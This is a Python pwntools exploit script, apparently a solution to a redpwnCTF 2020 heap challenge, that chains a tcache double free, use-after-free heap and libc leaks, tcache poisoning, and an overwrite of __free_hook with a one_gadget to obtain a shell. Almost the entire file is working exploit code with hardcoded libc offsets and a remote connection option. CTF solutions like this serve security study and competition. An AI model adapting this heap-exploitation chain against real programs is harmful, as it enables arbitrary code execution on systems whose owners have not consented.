#!/usr/bin/env python2

# tcache double free for arbitrary write for tcache poisoning
# UAF for heap leak
# tcache poisoning to increase count of chunks freed
# Since count of chunk freed increased, free again to put chunk in unsorted bin
# UAF again for libc leak
# Use tcache double free arbitrary write to overwrite __free_hook
# Last free to trigger one_gadget


import sys,os
from pwn import *

context.update(arch="amd64", endian="little", os="linux", )

LOCAL = True
HOST="2020.redpwnc.tf"
PORT=31774

TARGET=os.path.realpath("binary")

def allocate(size, data):
    r.sendlineafter(": ","1")
    r.sendlineafter(": ","0")
    r.sendlineafter(": ",str(size))
    r.sendlineafter(": ",data)

def free(idx=0):
    r.sendlineafter(": ","2")
    r.sendlineafter(": ",str(idx))

def show(idx=0):
    r.sendlineafter(": ","3")
    r.sendlineafter(": ",str(idx))

def exploit(r):

    allocate(0x110,"A"*14)
    allocate(0x100,"A"*14)
    free()
    free()
    show()

    heapleak = u64(r.recvline().strip()+"\x00\x00")-0x380
    log.info("Heap leak: {}".format(hex(heapleak)))
    
    
    allocate(0x100,p64(heapleak+24))
    allocate(0x100,p64(heapleak+0x380))
    allocate(0x100,p64(0x0700000000000000)+p64(0x0000000000000008)+p64(0)*20+p64(heapleak+0x380)+p64(heapleak+0x260))
    allocate(0x110,"A"*14)
    free()
    show()

    libcleak = u64(r.recvline().strip()+"\x00\x00")-0x3ebca0
    log.info("Libc leak: {}".format(hex(libcleak)))

    allocate(0x100,p64(libcleak+0x3ed8e8))
    allocate(0x100,p64(libcleak+0x3ed8e8))
    allocate(0x100,p64(libcleak+0x4f322))
    free()

    log.success("Got shell")

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])
        pause()

    exploit(r)

    sys.exit(0)
